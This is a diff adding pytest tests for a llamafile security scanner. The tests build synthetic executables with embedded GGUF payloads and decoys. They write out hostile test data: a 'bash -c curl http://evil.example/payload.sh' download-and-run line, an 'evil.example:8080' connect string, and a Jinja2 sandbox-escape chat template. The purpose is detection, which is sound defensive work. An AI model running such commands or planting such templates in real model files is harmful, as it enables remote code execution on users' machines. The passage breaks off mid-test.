@@ -2,6 +2,7 @@ from __future__ import annotations
 
 import hashlib
 import struct
+import zipfile
 from pathlib import Path
 from typing import Any
 
@@ -9,12 +10,36 @@ import pytest
 
 from modelaudit.cache import get_cache_manager, reset_cache_manager
 from modelaudit.core import determine_exit_code, scan_model_directory_or_file
+from modelaudit.scanners import llamafile_scanner as llamafile_scanner_module
 from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, CheckStatus, IssueSeverity, ScanResult
 from modelaudit.scanners.llamafile_scanner import (
+    LLAMAFILE_GGUF_AMBIGUOUS_PAYLOAD_REASON,
+    LLAMAFILE_GGUF_ANALYSIS_INCOMPLETE_REASON,
+    LLAMAFILE_GGUF_CANDIDATE_SCAN_LIMIT_REASON,
+    LLAMAFILE_GGUF_HEADER_INCOMPLETE_REASON,
+    LLAMAFILE_GGUF_HEADER_LIMIT_REASON,
+    LLAMAFILE_GGUF_MAX_HEADER_CANDIDATES,
+    LLAMAFILE_GGUF_MAX_PAYLOAD_CANDIDATE_SCANS,
+    LLAMAFILE_GGUF_ZIP_MEMBER_INCOMPLETE_REASON,
     LLAMAFILE_PAYLOAD_SCAN_LIMIT_REASON,
     LLAMAFILE_ROUTE_SCAN_BYTES,
     LLAMAFILE_ROUTE_TAIL_SCAN_BYTES,
+    LLAMAFILE_RUNTIME_INTERPRETER_TOKEN_LIMIT_REASON,
+    LLAMAFILE_RUNTIME_MAX_EVIDENCE,
+    LLAMAFILE_RUNTIME_MAX_INTERPRETER_CANDIDATES,
+    LLAMAFILE_RUNTIME_MAX_INTERPRETER_TOKENS,
+    LLAMAFILE_RUNTIME_MAX_TRANSFER_CONTEXT_BYTES,
+    LLAMAFILE_RUNTIME_MAX_TRANSFER_TOKENS,
     LLAMAFILE_RUNTIME_PREVIEW_READ_REASON,
+    LLAMAFILE_RUNTIME_SCAN_LIMIT_REASON,
+    LLAMAFILE_RUNTIME_STREAM_MAX_STRING_BYTES,
+    LLAMAFILE_RUNTIME_STREAM_READ_REASON,
+    LLAMAFILE_RUNTIME_STRING_SCAN_LIMIT_REASON,
+    LLAMAFILE_RUNTIME_TRANSFER_OPTION_AMBIGUOUS_REASON,
+    LLAMAFILE_RUNTIME_TRANSFER_TOKEN_LIMIT_REASON,
+    LLAMAFILE_RUNTIME_UTF16_AMBIGUOUS_REASON,
+    LLAMAFILE_TORCH7_CANDIDATE_PROBE_LIMIT_REASON,
+    LLAMAFILE_TORCH7_MAX_MARKER_CANDIDATES,
     LlamafileScanner,
     find_structural_torch7_offset,
 )
@@ -35,6 +60,175 @@ def _build_llamafile_blob(
     return header + marker + runtime + b"\x00" * 256 + payload
 
 
+def _write_sparse_runtime_gap_llamafile(
+    path: Path,
+    hidden_runtime: bytes,
+    *,
+    hidden_offset: int = 4 * 1024 * 1024,
+) -> None:
+    file_size = 12 * 1024 * 1024
+    with path.open("wb") as handle:
+        handle.write(b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56)
+        handle.seek(hidden_offset)
+        handle.write(hidden_runtime + b"\n")
+        handle.seek(6 * 1024 * 1024)
+        handle.write(b"llamafile runtime\n")
+        handle.seek(file_size - 1)
+        handle.write(b"\x00")
+
+
+def _build_gguf_string_metadata(entries: list[tuple[str, str]], *, version: int = 3) -> bytes:
+    payload = bytearray(b"GGUF")
+    payload.extend(struct.pack("<IQQ", version, 0, len(entries)))
+    for key, value in entries:
+        encoded_key = key.encode()
+        encoded_value = value.encode()
+        payload.extend(struct.pack("<Q", len(encoded_key)))
+        payload.extend(encoded_key)
+        payload.extend(struct.pack("<IQ", 8, len(encoded_value)))
+        payload.extend(encoded_value)
+    return bytes(payload)
+
+
+def _build_mapped_executable_header(
+    executable_format: str,
+    mapped_size: int,
+    *,
+    elf_machine: int = 62,
+) -> bytes:
+    if executable_format == "elf":
+        ident = b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 8
+        header = ident + struct.pack("<HHIQQQIHHHHHH", 2, elf_machine, 1, 0, 64, 0, 0, 64, 56, 1, 0, 0, 0)
+        segment = struct.pack("<IIQQQQQQ", 1, 5, 0, 0, 0, mapped_size, mapped_size, 4096)
+        return header + segment
+
+    if executable_format == "pe":
+        optional_header_size = 0xF0
+        section_table_offset = 0x80 + 24 + optional_header_size
+        header = bytearray(section_table_offset + 40)
+        header[:2] = b"MZ"
+        struct.pack_into("<I", header, 0x3C, 0x80)
+        header[0x80:0x84] = b"PE\x00\x00"
+        struct.pack_into("<HHIIIHH", header, 0x84, 0x8664, 1, 0, 0, 0, optional_header_size, 0x2022)
+        struct.pack_into("<H", header, 0x98, 0x20B)
+        struct.pack_into("<I", header, 0x98 + 60, 512)
+        header[section_table_offset : section_table_offset + 8] = b".text\x00\x00\x00"
+        struct.pack_into("<II", header, section_table_offset + 16, mapped_size, 0)
+        return bytes(header)
+
+    if executable_format == "mach-o":
+        header = b"\xcf\xfa\xed\xfe" + struct.pack("<iiIIIII", 0x01000007, 3, 2, 1, 72, 0, 0)
+        segment = struct.pack(
+            "<II16sQQQQiiII",
+            0x19,
+            72,
+            b"__TEXT\x00" * 2,
+            0,
+            mapped_size,
+            0,
+            mapped_size,
+            7,
+            5,
+            0,
+            0,
+        )
+        return header + segment
+
+    raise ValueError(f"Unsupported executable format: {executable_format}")
+
+
+def _build_zero_size_mapping_header(executable_format: str, mapping_offset: int) -> bytes:
+    header = bytearray(_build_mapped_executable_header(executable_format, 0))
+    if executable_format == "elf":
+        struct.pack_into("<Q", header, 64 + 8, mapping_offset)
+    elif executable_format == "pe":
+        section_table_offset = 0x80 + 24 + 0xF0
+        struct.pack_into("<I", header, section_table_offset + 20, mapping_offset)
+    elif executable_format == "mach-o":
+        struct.pack_into("<Q", header, 32 + 40, mapping_offset)
+    else:
+        raise ValueError(f"Unsupported executable format: {executable_format}")
+    return bytes(header)
+
+
+def _write_sparse_mapped_llamafile(
+    path: Path,
+    executable_format: str,
+    *,
+    embedded_payload: bytes,
+    mapped_runtime: bytes = b"benign mapped runtime",
+    include_mapped_gguf_decoy: bool = False,
+) -> int:
+    mapped_size = 8 * 1024 * 1024
+    payload_offset = 10 * 1024 * 1024
+    with path.open("wb") as handle:
+        handle.write(_build_mapped_executable_header(executable_format, mapped_size))
+        if include_mapped_gguf_decoy:
+            handle.seek(3 * 1024 * 1024)
+            handle.write(b"GGUF" + struct.pack("<IQQ", 3, 0, 0))
+        handle.seek(4 * 1024 * 1024)
+        handle.write(mapped_runtime + b"\n")
+        handle.seek(6 * 1024 * 1024)
+        handle.write(b"llamafile runtime\n")
+        handle.seek(payload_offset)
+        handle.write(embedded_payload)
+    return payload_offset
+
+
+def _write_ape_zip_llamafile(
+    path: Path,
+    embedded_payload: bytes,
+    *,
+    runtime: bytes = b"benign runtime",
+    member_name: str = "weights/model.gguf",
+    compression: int = zipfile.ZIP_STORED,
+) -> None:
+    with zipfile.ZipFile(path, "w", compression=compression) as archive:
+        archive.writestr(member_name, embedded_payload)
+    archive_bytes = path.read_bytes()
+    stub_size = 8192
+    stub = bytearray(stub_size)
+    header = bytearray(_build_mapped_executable_header("pe", 4096))
+    header[:6] = b"MZqFpD"
+    stub[: len(header)] = header
+    stub[1024 : 1024 + len(b"llamafile runtime\n")] = b"llamafile runtime\n"
+    stub[2048 : 2048 + len(runtime)] = runtime
+    embedded_elf = _build_mapped_executable_header("elf", 2048, elf_machine=183)
+    stub[4096 : 4096 + len(embedded_elf)] = embedded_elf
+    path.write_bytes(bytes(stub) + archive_bytes)
+
+
+def _write_ape_raw_llamafile(
+    path: Path,
+    *,
+    file_size: int,
+    gguf_payload: bytes,
+    runtime_offset: int | None = None,
+    runtime: bytes | None = None,
+    later_elf_offset: int | None = None,
+) -> int:
+    gguf_offset = 24 * 1024
+    with path.open("wb") as handle:
+        header = bytearray(_build_mapped_executable_header("pe", 4096))
+        header[:6] = b"MZqFpD"
+        handle.write(header)
+        handle.seek(1024)
+        handle.write(b"llamafile runtime\n")
+        handle.seek(8 * 1024)
+        handle.write(_build_mapped_executable_header("elf", 8 * 1024, elf_machine=183))
+        handle.seek(gguf_offset)
+        handle.write(gguf_payload)
+        if runtime_offset is not None and runtime is not None:
+            handle.seek(runtime_offset)
+            handle.write(runtime)
+        if later_elf_offset is not None:
+            handle.seek(later_elf_offset)
+            handle.write(_build_mapped_executable_header("elf", 8 * 1024, elf_machine=183))
+        handle.seek(file_size - 1)
+        handle.write(b"\x00")
+    return gguf_offset
+
+
 def test_llamafile_scanner_can_handle_detected_llamafile(tmp_path: Path) -> None:
     binary = tmp_path / "model.llamafile"
     binary.write_bytes(_build_llamafile_blob())
@@ -47,6 +241,21 @@ def test_llamafile_scanner_can_handle_detected_llamafile_with_misleading_suffix(
     binary.write_bytes(_build_llamafile_blob())
 
     assert LlamafileScanner.can_handle(str(binary))
+
+
+@pytest.mark.parametrize("magic", [b"\xca\xfe\xba\xbf", b"\xbf\xba\xfe\xca"])
+def test_llamafile_scanner_can_handle_fat64_macho_magic(tmp_path: Path, magic: bytes) -> None:
+    binary = tmp_path / "fat64-payload.bin"
+    binary.write_bytes(magic + b"\x00" * 128 + b"llamafile runtime")
+
+    assert LlamafileScanner.can_handle(str(binary))
+
+
+def test_llamafile_scanner_does_not_route_fat64_macho_near_match(tmp_path: Path) -> None:
+    binary = tmp_path / "fat64-near-match.bin"
+    binary.write_bytes(b"\xca\xfe\xba\xc0" + b"\x00" * 128 + b"llamafile runtime")
+
+    assert not LlamafileScanner.can_handle(str(binary))
 
 
 def test_llamafile_scanner_does_not_misclassify_generic_executable(tmp_path: Path) -> None:
@@ -110,6 +319,947 @@ def test_llamafile_scanner_flags_true_middle_runtime_strings(tmp_path: Path) -> 
     result = LlamafileScanner().scan(str(binary))
 
     assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
+
+
+def test_llamafile_scanner_streams_runtime_between_preview_windows(tmp_path: Path) -> None:
+    binary = tmp_path / "runtime-preview-gap.llamafile"
+    _write_sparse_runtime_gap_llamafile(binary, b"bash -c curl http://evil.example/payload.sh")
+
+    result = LlamafileScanner().scan(str(binary))
+
+    assert result.metadata.get("analysis_incomplete") is not True
+    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
+
+
+def test_llamafile_scanner_keeps_fully_streamed_benign_runtime_complete(tmp_path: Path) -> None:
+    binary = tmp_path / "benign-runtime-preview-gap.llamafile"
+    _write_sparse_runtime_gap_llamafile(binary, b"benign runtime text")
+
+    result = LlamafileScanner().scan(str(binary))
+
+    high_severity = [
+        issue for issue in result.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+    ]
+    assert high_severity == []
+    assert result.success is True
+    assert result.metadata.get("analysis_incomplete") is not True
+    assert result.bytes_scanned <= binary.stat().st_size
+
+
+@pytest.mark.parametrize(
+    ("endpoint", "expect_finding"),
+    [("evil.example:8080", True), ("localhost:8080", False)],
+)
+def test_llamafile_scanner_preserves_runtime_strings_across_stream_chunks(
+    tmp_path: Path,
+    endpoint: str,
+    expect_finding: bool,
+) -> None:
+    binary = tmp_path / f"chunk-boundary-{endpoint.split(':')[0]}.llamafile"
+    safe_prefix = b"%'18T connect(" + (b" " * 600)
+    hidden_offset = (1024 * 1024) - len(safe_prefix)
+    _write_sparse_runtime_gap_llamafile(
+        binary,
+        safe_prefix + endpoint.encode() + b")",
+        hidden_offset=hidden_offset,
+    )
+
+    result = LlamafileScanner().scan(str(binary))
+
+    runtime_checks = [check for check in result.checks if check.name == "Llamafile Runtime String Analysis"]
+    assert bool(runtime_checks) is expect_finding
+    if expect_finding:
+        assert runtime_checks[0].status == CheckStatus.FAILED
+        assert runtime_checks[0].details["network_evidence"]
+    else:
+        assert result.success is True
+
+
+def test_llamafile_scanner_preserves_literal_heredoc_state_across_stream_chunks(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    declaration = "cat <<'EOF'\n"
+    chunk_size = 64 + len(b"llamafile runtime\n") + len(declaration.encode())
+    monkeypatch.setattr(llamafile_scanner_module, "LLAMAFILE_RUNTIME_STREAM_CHUNK_BYTES", chunk_size)
+    binary = tmp_path / "chunk-boundary-literal-heredoc.llamafile"
+    binary.write_bytes(_build_llamafile_blob(runtime_lines=[f"{declaration}curl internal-host\nEOF"]))
+
+    result = LlamafileScanner().scan(str(binary))
+
+    runtime_checks = [check for check in result.checks if check.name == "Llamafile Runtime String Analysis"]
+    assert not any(check.severity == IssueSeverity.CRITICAL for check in runtime_checks)
+
+
+def test_llamafile_streaming_nul_terminates_literal_heredoc_state(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    declaration = "cat <<'EOF'\0"
+    chunk_size = 64 + len(b"llamafile runtime\n") + len(declaration.encode())
+    monkeypatch.setattr(llamafile_scanner_module, "LLAMAFILE_RUNTIME_STREAM_CHUNK_BYTES", chunk_size)
+    binary = tmp_path / "chunk-boundary-nul-heredoc.llamafile"
+    binary.write_bytes(_build_llamafile_blob(runtime_lines=[f"{declaration}curl internal-host\0EOF"]))
+
+    result = LlamafileScanner().scan(str(binary))
+
+    runtime_issues = [issue for issue in result.issues if "Executable runtime contains" in issue.message]
+    assert any(issue.severity == IssueSeverity.CRITICAL for issue in runtime_issues)
+
+
+def test_llamafile_literal_heredoc_analysis_does_not_rescan_unterminated_bodies(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    original = llamafile_scanner_module._shell_heredoc_declarations
+    calls = 0
+
+    def count_declarations(
+        line: str,
+        overridden_consumers: set[str] | frozenset[str] = frozenset(),
+    ) -> list[tuple[str, bool, bool]]:
+        nonlocal calls
+        calls += 1
+        return original(line, overridden_consumers)
+
+    monkeypatch.setattr(llamafile_scanner_module, "_shell_heredoc_declarations", count_declarations)
+
+    spans = llamafile_scanner_module._quoted_heredoc_body_spans("cat <<'EOF'\n" * 8_000)
+
+    assert calls == 1
+    assert spans == [(len("cat <<'EOF'\n"), len("cat <<'EOF'\n") * 8_000)]
+
+
+def test_llamafile_literal_heredoc_declarations_bound_context_parsing(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    original = llamafile_scanner_module._heredoc_body_is_passive_data
+    calls = 0
+
+    def count_context(
+        line: str,
+        operator_start: int,
+        overridden_consumers: set[str] | frozenset[str] = frozenset(),
+    ) -> bool:
+        nonlocal calls
+        calls += 1
+        return original(line, operator_start, overridden_consumers)
+
+    monkeypatch.setattr(llamafile_scanner_module, "_heredoc_body_is_passive_data", count_context)
+
+    declarations = llamafile_scanner_module._shell_heredoc_declarations("cat " + "<<'EOF' " * 800)
+
+    assert calls == 1
+    assert len(declarations) == llamafile_scanner_module.LLAMAFILE_RUNTIME_MAX_HEREDOC_DECLARATIONS
+
+
+@pytest.mark.parametrize("executable_format", ["elf", "pe", "mach-o"])
+def test_llamafile_scanner_ignores_mapped_gguf_decoys_as_payload_boundaries(
+    tmp_path: Path,
+    executable_format: str,
+) -> None:
+    binary = tmp_path / f"mapped-gguf-decoy-{executable_format}.llamafile"
+    expected_payload_offset = _write_sparse_mapped_llamafile(
+        binary,
+        executable_format,
+        embedded_payload=b"GGUF" + struct.pack("<IQQ", 3, 0, 0),
+        mapped_runtime=b"bash -c curl http://evil.example/payload.sh",
+        include_mapped_gguf_decoy=True,
+    )
+
+    result = LlamafileScanner().scan(str(binary))
+
+    assert result.metadata["embedded_payload_offset"] == expected_payload_offset
+    assert result.metadata["embedded_payload_boundary_trusted"] is True
+    assert any(
+        check.name == "Llamafile Runtime String Analysis" and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+
+
+def test_llamafile_scanner_honors_pe_size_of_headers_before_payload_boundary(tmp_path: Path) -> None:
+    binary = tmp_path / "pe-header-gguf-decoy.llamafile"
+    header = bytearray(_build_mapped_executable_header("pe", 0))
+    struct.pack_into("<I", header, 0x98 + 60, 4096)
+    expected_payload_offset = 5000
+    blob = bytearray(6000)
+    blob[: len(header)] = header
+    blob[600:624] = b"GGUF" + struct.pack("<IQQ", 3, 0, 0)
+    blob[1000:1044] = b"bash -c curl http://evil.example/payload.sh"
+    blob[2000:2018] = b"llamafile runtime\n"
+    blob[expected_payload_offset : expected_payload_offset + 24] = b"GGUF" + struct.pack("<IQQ", 3, 0, 0)
+    binary.write_bytes(blob)
+
+    result = LlamafileScanner().scan(str(binary))
+
+    assert result.metadata["mapped_executable_end"] == 4096
+    assert result.metadata["embedded_payload_offset"] == expected_payload_offset
+    assert result.metadata["embedded_payload_boundary_trusted"] is True
+    assert any(check.name == "Llamafile Runtime String Analysis" for check in result.checks)
+
+
+def test_llamafile_scanner_extends_ape_mapping_through_embedded_elf(tmp_path: Path) -> None:
+    binary = tmp_path / "ape-embedded-elf.llamafile"
+    pe_end = 3 * 1024 * 1024
+    elf_base = pe_end + 8192
+    elf_size = 2 * 1024 * 1024
+    payload_offset = elf_base + elf_size + 4096
+    with binary.open("wb") as handle:
+        ape_header = bytearray(_build_mapped_executable_header("pe", pe_end))
+        ape_header[:6] = b"MZqFpD"
+        handle.write(ape_header)
+        handle.seek(1024 * 1024)
+        handle.write(b"llamafile runtime\n")
+        handle.seek(elf_base)
+        handle.write(_build_mapped_executable_header("elf", elf_size, elf_machine=183))
+        handle.seek(elf_base + 1024 * 1024)
+        handle.write(b"GGUF" + struct.pack("<IQQ", 3, 0, 0))
+        handle.write(b"\x00bash -c curl http://evil.example/payload.sh\x00")
+        handle.seek(payload_offset)
+        handle.write(b"GGUF" + struct.pack("<IQQ", 3, 0, 0))
+
+    result = LlamafileScanner().scan(str(binary))
+
+    assert result.metadata["mapped_executable_end"] == elf_base + elf_size
+    assert result.metadata["embedded_payload_offset"] == payload_offset
+    assert any(check.name == "Llamafile Runtime String Analysis" for check in result.checks)
+
+
+def test_llamafile_scanner_rejects_fat_macho_slice_overlapping_header(tmp_path: Path) -> None:
+    binary = tmp_path / "invalid-fat-macho.llamafile"
+    fat_header = b"\xca\xfe\xba\xbe" + struct.pack(">IiiIII", 1, 0x01000007, 3, 0, 4, 0)
+    binary.write_bytes(
+        fat_header
+        + b"\x00llamafile runtime\x00"
+        + b"GGUF"
+        + struct.pack("<IQQ", 3, 0, 0)
+        + b"\x00bash -c curl http://evil.example/payload.sh\x00"
+    )
+
+    result = LlamafileScanner().scan(str(binary))
+
+    assert "mapped_executable_end" not in result.metadata
+    assert result.metadata["embedded_payload_boundary_trusted"] is False
+    assert any(check.name == "Llamafile Runtime String Analysis" for check in result.checks)
+
+
+def test_llamafile_scanner_parses_fat_macho_slice_before_trusting_payload_boundary(tmp_path: Path) -> None:
+    binary = tmp_path / "inflated-fat-macho.llamafile"
+    slice_offset = 4096
+    declared_slice_size = 2 * 1024 * 1024
+    mapped_size = 256
+    payload_offset = slice_offset + 512
+    decoy_offset = slice_offset + declared_slice_size + 1024
+    malicious_payload = _build_gguf_string_metadata(
+        [("tokenizer.chat_template", "{{ ''.__class__.__mro__[1].__subclasses__() }}")]
+    )
+    fat_header = b"\xca\xfe\xba\xbe" + struct.pack(
+        ">IiiIII",
+        1,
+        0x01000007,
+        3,
+        slice_offset,
+        declared_slice_size,
+        12,
+    )
+    with binary.open("wb") as handle:
+        handle.write(fat_header)
+        handle.seek(slice_offset)
+        handle.write(_build_mapped_executable_header("mach-o", mapped_size))
+        handle.seek(slice_offset + 128)
+        handle.write(b"llamafile runtime\n")
+        handle.seek(payload_offset)
+        handle.write(malicious_payload)
+        handle.seek(decoy_offset)
+        handle.write(b"GGUF" + struct.pack("<IQQ", 3, 0, 0))
+
+    result = LlamafileScanner().scan(str(binary))
+
+    assert result.metadata["mapped_executable_end"] == slice_offset + mapped_size
+    assert LLAMAFILE_GGUF_AMBIGUOUS_PAYLOAD_REASON in result.metadata["scan_outcome_reasons"]
+    assert any(
+        check.name == "Llamafile Embedded Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
+        for check in result.checks
+    )
+
+
+@pytest.mark.parametrize("executable_format", ["elf", "pe", "mach-o"])
+def test_llamafile_scanner_ignores_zero_size_mappings_when_finding_payloads(
+    tmp_path: Path,
+    executable_format: str,
+) -> None:
+    binary = tmp_path / f"zero-size-mapping-{executable_format}.llamafile"
+    payload_offset = 9 * 1024 * 1024
+    empty_mapping_offset = 10 * 1024 * 1024
+    decoy_offset = 11 * 1024 * 1024
+    malicious_payload = _build_gguf_string_metadata(
+        [("tokenizer.chat_template", "{{ ''.__class__.__mro__[1].__subclasses__() }}")]
+    )
+    with binary.open("wb") as handle:
+        handle.write(_build_zero_size_mapping_header(executable_format, empty_mapping_offset))
+        handle.seek(6 * 1024 * 1024)
+        handle.write(b"llamafile runtime\n")
+        handle.seek(payload_offset)
+        handle.write(malicious_payload)
+        handle.seek(decoy_offset)
+        handle.write(b"GGUF" + struct.pack("<IQQ", 3, 0, 0))
+
+    result = LlamafileScanner().scan(str(binary))
+
+    assert result.metadata["mapped_executable_end"] < payload_offset
+    assert LLAMAFILE_GGUF_AMBIGUOUS_PAYLOAD_REASON in result.metadata["scan_outcome_reasons"]
+    assert any(
+        check.name == "Llamafile Embedded Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
+        for check in result.checks
+    )
+
+
+@pytest.mark.parametrize("executable_format", ["elf", "pe", "mach-o"])
+def test_llamafile_scanner_scans_gguf_candidates_inside_mapped_executable_ranges(
+    tmp_path: Path,
+    executable_format: str,
+) -> None:
+    binary = tmp_path / f"mapped-payload-{executable_format}.llamafile"
+    mapped_size = 10 * 1024 * 1024
+    payload_offset = 9 * 1024 * 1024
+    decoy_offset = 11 * 1024 * 1024
+    malicious_payload = _build_gguf_string_metadata(
+        [("tokenizer.chat_template", "{{ ''.__class__.__mro__[1].__subclasses__() }}")]
+    )
+    with binary.open("wb") as handle:
+        handle.write(_build_mapped_executable_header(executable_format, mapped_size))
+        handle.seek(6 * 1024 * 1024)
+        handle.write(b"llamafile runtime\n")
+        handle.seek(payload_offset)
+        handle.write(malicious_payload)
+        handle.seek(decoy_offset)
+        handle.write(b"GGUF" + struct.pack("<IQQ", 3, 0, 0))
+
+    result = LlamafileScanner().scan(str(binary))
+
+    assert result.metadata["mapped_executable_end"] == mapped_size
+    assert result.metadata["embedded_payload_boundary_trusted"] is True
+    assert any(
+        check.name == "Llamafile Embedded Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
+        for check in result.checks
+    )
+
+
+def test_llamafile_scanner_prioritizes_selected_gguf_boundary_after_many_mapped_decoys(tmp_path: Path) -> None:
+    binary = tmp_path / "many-mapped-gguf-decoys.llamafile"
+    malicious_payload = _build_gguf_string_metadata(
+        [("tokenizer.chat_template", "{{ ''.__class__.__mro__[1].__subclasses__() }}")]
+    )
+    payload_offset = _write_sparse_mapped_llamafile(binary, "elf", embedded_payload=malicious_payload)
+    decoy = b"GGUF" + struct.pack("<IQQ", 3, 0, 0)
+    with binary.open("r+b") as handle:
+        for index in range(LLAMAFILE_GGUF_MAX_PAYLOAD_CANDIDATE_SCANS + 1):
+            handle.seek((1024 * 1024) + (index * 64))
+            handle.write(decoy)
+
+    result = LlamafileScanner().scan(str(binary))
+
+    assert result.metadata["embedded_payload_offset"] == payload_offset
+    assert result.metadata["embedded_payload_boundary_trusted"] is True
+    assert LLAMAFILE_GGUF_CANDIDATE_SCAN_LIMIT_REASON in result.metadata["scan_outcome_reasons"]
+    assert any(
+        check.name == "Llamafile Embedded Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
+        for check in result.checks
+    )
+
+
+def test_llamafile_scanner_keeps_benign_selected_gguf_boundary_clean_after_many_mapped_decoys(
+    tmp_path: Path,
+) -> None:
+    binary = tmp_path / "many-mapped-gguf-decoys-benign.llamafile"
+    benign_payload = _build_gguf_string_metadata(
+        [("general.description", "INFO llama server listening on http://127.0.0.1:8080")]
+    )
+    payload_offset = _write_sparse_mapped_llamafile(binary, "elf", embedded_payload=benign_payload)
+    decoy = b"GGUF" + struct.pack("<IQQ", 3, 0, 0)
+    with binary.open("r+b") as handle:
+        for index in range(LLAMAFILE_GGUF_MAX_PAYLOAD_CANDIDATE_SCANS + 1):
+            handle.seek((1024 * 1024) + (index * 64))
+            handle.write(decoy)
+
+    result = LlamafileScanner().scan(str(binary))
+
+    assert result.metadata["embedded_payload_offset"] == payload_offset
+    assert result.metadata["embedded_payload_boundary_trusted"] is True
+    assert not any(check.name == "Llamafile Runtime String Analysis" for check in result.checks)
+    assert not any(
+        check.status == CheckStatus.FAILED and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+
+
+def test_llamafile_scanner_reserves_carve_budget_for_mapped_gguf_candidates(tmp_path: Path) -> None:
+    binary = tmp_path / "mapped-malicious-gguf-before-large-selected-payload.llamafile"
+    mapped_size = 8 * 1024 * 1024
+    malicious_offset = 1024 * 1024
+    selected_offset = 10 * 1024 * 1024
+    malicious_payload = _build_gguf_string_metadata(
+        [("tokenizer.chat_template", "{{ ''.__class__.__mro__[1].__subclasses__() }}")]
+    )
+    benign_payload = _build_gguf_string_metadata([("general.description", "benign model")])
+    with binary.open("wb") as handle:
+        handle.write(_build_mapped_executable_header("elf", mapped_size))
+        handle.seek(malicious_offset)
+        handle.write(malicious_payload)
+        handle.seek(6 * 1024 * 1024)
+        handle.write(b"llamafile runtime\n")
+        handle.seek(selected_offset)
+        handle.write(benign_payload)
+        handle.seek(selected_offset + 1024)
+        handle.write(b"\x00")
+
+    result = LlamafileScanner(config={"llamafile_payload_carve_bytes": 512}).scan(str(binary))
+
+    assert result.metadata["embedded_payload_offset"] == selected_offset
+    assert result.metadata["embedded_payload_boundary_trusted"] is True
+    assert any(
+        check.name == "Llamafile Embedded Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
+        for check in result.checks
+    )
+
+
+def test_llamafile_scanner_selects_real_payload_after_post_mapping_gguf_decoy(tmp_path: Path) -> None:
+    binary = tmp_path / "post-mapping-gguf-decoy.llamafile"
+    mapped_size = 8 * 1024 * 1024
+    decoy_offset = 9 * 1024 * 1024
+    payload_offset = 10 * 1024 * 1024
+    malicious_payload = _build_gguf_string_metadata(
+        [("tokenizer.chat_template", "{{ ''.__class__.__mro__[1].__subclasses__() }}")]
+    )
+    with binary.open("wb") as handle:
+        handle.write(_build_mapped_executable_header("elf", mapped_size))
+        handle.seek(6 * 1024 * 1024)
+        handle.write(b"llamafile runtime\n")
+        handle.seek(decoy_offset)
+        handle.write(b"GGUF" + struct.pack("<IQQ", 3, 0, 0))
+        handle.seek(payload_offset)
+        handle.write(malicious_payload)
+
+    result = LlamafileScanner().scan(str(binary))
+
+    assert LLAMAFILE_GGUF_AMBIGUOUS_PAYLOAD_REASON in result.metadata["scan_outcome_reasons"]
+    assert result.metadata["embedded_payload_offset"] == payload_offset
+    assert any(
+        check.name == "Llamafile Embedded Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
+        for check in result.checks
+    )
+
+
+def test_llamafile_scanner_preserves_real_payload_finding_before_trailing_gguf_decoy(tmp_path: Path) -> None:
+    binary = tmp_path / "post-payload-gguf-decoy.llamafile"
+    mapped_size = 8 * 1024 * 1024
+    payload_offset = 9 * 1024 * 1024
+    decoy_offset = 10 * 1024 * 1024
+    malicious_payload = _build_gguf_string_metadata(
+        [("tokenizer.chat_template", "{{ ''.__class__.__mro__[1].__subclasses__() }}")]
+    )
+    with binary.open("wb") as handle:
+        handle.write(_build_mapped_executable_header("elf", mapped_size))
+        handle.seek(6 * 1024 * 1024)
+        handle.write(b"llamafile runtime\n")
+        handle.seek(payload_offset)
+        handle.write(malicious_payload)
+        handle.seek(decoy_offset)
+        handle.write(b"GGUF" + struct.pack("<IQQ", 3, 0, 0))
+
+    result = LlamafileScanner().scan(str(binary))
+
+    assert result.metadata["embedded_payload_candidate_offsets"] == [payload_offset, decoy_offset]
+    assert LLAMAFILE_GGUF_AMBIGUOUS_PAYLOAD_REASON in result.metadata["scan_outcome_reasons"]
+    assert any(
+        check.name == "Llamafile Embedded Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
+        for check in result.checks
+    )
+
+
+def test_llamafile_multiple_benign_gguf_candidates_are_inconclusive_and_not_cached(tmp_path: Path) -> None:
+    binary = tmp_path / "ambiguous-gguf.llamafile"
+    candidate = b"GGUF" + struct.pack("<IQQ", 3, 0, 0)
+    binary.write_bytes(_build_llamafile_blob(embedded_payload=candidate + candidate))
+
+    direct = LlamafileScanner().scan(str(binary))
+
+    assert direct.success is False
+    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+    assert LLAMAFILE_GGUF_AMBIGUOUS_PAYLOAD_REASON in direct.metadata["scan_outcome_reasons"]
+    checks = [check for check in direct.checks if check.name == "Llamafile Embedded Payload Disambiguation"]
+    assert len(checks) == 1
+    assert checks[0].message == "Multiple plausible embedded GGUF payload boundaries were found"
+
+    aggregate = scan_model_directory_or_file(str(binary), cache_scan_results=False)
+    assert aggregate.success is False
+    assert determine_exit_code(aggregate) == 2
+
+    cache_dir = tmp_path / "ambiguous-gguf-cache"
+    reset_cache_manager()
+    try:
+        cached_aggregate = scan_model_directory_or_file(
+            str(binary),
+            cache_enabled=True,
+            cache_dir=str(cache_dir),
+            min_cache_file_size=0,
+        )
+        assert cached_aggregate.success is False
+        assert determine_exit_code(cached_aggregate) == 2
+        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
+    finally:
+        reset_cache_manager()
+
+
+def test_llamafile_scanner_trusts_structural_zip_gguf_boundary_for_ape(tmp_path: Path) -> None:
+    binary = tmp_path / "ape-zip-gguf.llamafile"
+    _write_ape_zip_llamafile(
+        binary,
+        _build_gguf_string_metadata(
+            [
+                ("general.architecture", "llama"),
